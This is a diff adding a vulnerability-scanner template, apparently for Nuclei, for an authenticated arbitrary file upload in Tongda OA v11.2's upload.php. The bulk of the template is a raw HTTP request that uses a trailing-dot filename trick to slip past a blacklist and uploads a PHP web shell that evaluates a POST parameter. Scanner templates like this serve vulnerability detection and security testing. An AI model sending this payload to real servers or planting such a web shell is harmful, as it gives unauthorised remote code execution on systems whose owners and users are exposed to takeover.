@@ -1,0 +1,65 @@
+id: tongdaOA-v2-upload-file-upload
+
+info:
+  name: 通达OA v11.2 upload.php 后台任意文件上传漏洞
+  author: cnaq  
+  severity: info
+  description: 通达OA v11.2后台存在文件上传漏洞，允许通过绕过黑名单的方法来上传恶意文件，导致服务器被攻击
+  reference:
+    - http://wiki.peiqi.tech/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.2%20upload.php%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html
+  tags: tongdaOA,file,upload
+
+requests:
+  - raw:
+      - |
+        POST /module/upload/upload.php?module=im HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0
+        Accept: */*
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Content-Type: multipart/form-data; boundary=---------------------------284752732530005741142551739396
+        Content-Length: 893
+        Origin: http://192.168.130.128:1080
+        Connection: close
+        Referer: http://192.168.130.128:1080/general/index.php?isIE=0&modify_pwd=0
+        Cookie: PHPSESSID=bop1b7pnk5ki4r9uebsunv1p52; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=cb8475b4; hideTopbar=1
+
+        -----------------------------284752732530005741142551739396
+        Content-Disposition: form-data; name="id"
+
+        WU_FILE_7
+        -----------------------------284752732530005741142551739396
+        Content-Disposition: form-data; name="name"
+
+        shell.php
+        -----------------------------284752732530005741142551739396
+        Content-Disposition: form-data; name="type"
+
+        application/octet-stream
+        -----------------------------284752732530005741142551739396
+        Content-Disposition: form-data; name="lastModifiedDate"
+
+        2022/11/7 11:33:13
+        -----------------------------284752732530005741142551739396
+        Content-Disposition: form-data; name="size"
+
+        35
+        -----------------------------284752732530005741142551739396
+        Content-Disposition: form-data; name="file"; filename="shell.php."
+        Content-Type: application/octet-stream
+
+        <?php eval(@$_POST['password']);?>
+
+        -----------------------------284752732530005741142551739396--
+    
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          
+      - type: word
+        part: body
+        words:
+          - 'id'
